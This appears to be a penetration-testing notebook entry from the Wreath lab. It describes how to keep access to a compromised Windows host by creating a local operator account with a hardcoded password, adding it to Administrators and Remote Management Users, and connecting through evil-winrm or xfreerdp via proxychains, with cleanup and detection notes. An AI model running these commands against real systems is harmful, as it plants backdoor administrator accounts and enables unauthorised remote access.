# Windows Admin Access Stabilization

Used on: **Wreath**

When command execution lands with local administrator rights, create a temporary operator account and add it to the groups needed for WinRM/RDP instead of relying on a fragile webshell.

## Prerequisites

- Administrator-level command execution on the Windows host.
- WinRM (`5985`) or RDP (`3389`) reachable through the current route.

## Steps

Create a local user:

<!-- cmd: windows -->
```cmd
net user tryzub Tryzub@ /add
```

Add the account to administrator and WinRM groups:

<!-- cmd: windows -->
```cmd
net localgroup Administrators tryzub /add
net localgroup "Remote Management Users" tryzub /add
net user tryzub
```

Connect over WinRM:

<!-- cmd: linux -->
```bash
proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
```

Or use RDP with a shared tooling directory:

<!-- cmd: linux -->
```bash
proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' \
  +clipboard /dynamic-resolution \
  /drive:/usr/share/windows-resources,share \
  /cert:ignore \
  /sec:tls
```

## Cleanup

<!-- cmd: windows -->
```cmd
net user tryzub /delete
```

## Defensive Note

Alert on local administrator group changes, Remote Management Users changes, and new local accounts created outside normal provisioning workflows.

## Related

- [../tools/evil-winrm.md](../../tools/windows/evil-winrm.md)
- [../tools/xfreerdp.md](../../tools/windows/xfreerdp.md)
- [windows-enumeration.md](../enumeration/windows-enumeration.md)


